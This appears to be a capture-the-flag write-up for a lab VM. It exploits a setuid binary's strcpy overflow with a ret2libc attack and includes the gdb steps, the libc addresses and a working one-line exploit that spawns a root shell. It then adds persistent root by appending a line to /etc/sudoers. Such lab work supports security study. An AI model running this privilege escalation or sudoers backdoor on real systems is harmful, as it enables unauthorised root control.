In the "zaz" user, we have a "exploit_me" binary and a mail folder, inside the mail folder there is nothing interesting.
The "exploit_me" binary have setuid, so we could probably gain root access from here,

The following is the decompiled version by using ghidra

bool main(int param_1,int param_2)
{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}

We can see that the binary is using "strcpy" which is vulnerable to buffer offer flow.

Using the guide from the following 2 URL, we can learn about how to perform a ret2libc attack
https://shellblade.net/files/docs/ret2libc.pdf
https://infosecwriteups.com/ret2libc-attack-in-lin-3dfc827c90c3

We can see from the decompiled version that the buffer is 140, lets try to see at which point we could overwriting the memory
Base on the explaination from the guide in the link above, we learned that the structure of the data looks like the following

.----------------.
|   140 buffer   |  -> the buffer size that was set by the main function 
|________________| 
|   Saved EBP    |  -> base pointer of the current stack, which the program used to access the local variable
|________________|
|       RET      |  -> return address after the function ended
|________________|

By writting more then 140 bytes, we could potentially overwriting the content of EBP and RET
Lets try it in GDB

```console
(gdb) r $(python -c 'print "a"*140 + "b"*4 + "c"*4')
Starting program: /home/zaz/exploit_me $(python -c 'print "a"*140 + "b"*4 + "c"*4')
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbcccc

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
```

We tested 140 "a" char, which should totally fill in the buffer, next we print 4 * "b" and 4 * "c",
The Segmentation fault happen on 0x62626262 which means that the 4 * "b" has been succesfully overwritten the EBP memory
In conclusion to overwritte the EBP address, we need an offset of 140 character.

Next we will need to spawn the shell by calling “system()” from LIBC and passing “/bin/sh” as arguments, which will be equal to system('/bin/sh')
“/bin/sh” should not be a string, we should point it from an address,
When the shell is spawned, we need to exit with "exit()" function, else the program will crash

```console
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

With a simple "p" or "print" command i gdb, we can get the address of the system and exit function is LIBC
To find the pointer to "bin/sh" string, we could do the following command on gdb

```console
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
```

The command is to search in libc for a fixed address of a /bin/sh string

Now we have all the neccessary address to do the exploit and we should convert it to little endian
system 0xb7e6b060   -> \x60\xb0\xe6\xb7
exit 0xb7e5ebe0     -> \xe0\xeb\xe5\xb7
/bin/sh 0xb7f8cc58  -> \x58\xcc\xf8\xb7

```console
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "a"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`�����X��
# whoami
root
```

Success! now we are root!

We can grant the user zaz into the sudoers file with the following command in the shell that was spawned
```console
echo "zaz	ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

Now we can try be root as zaz

```console
zaz@BornToSecHackMe:~$ sudo -s
[sudo] password for zaz:
root@BornToSecHackMe:~# whoami
root
```

Now whe have permanent root access via the zaz user!! 🥳 🎉 🎉 🎉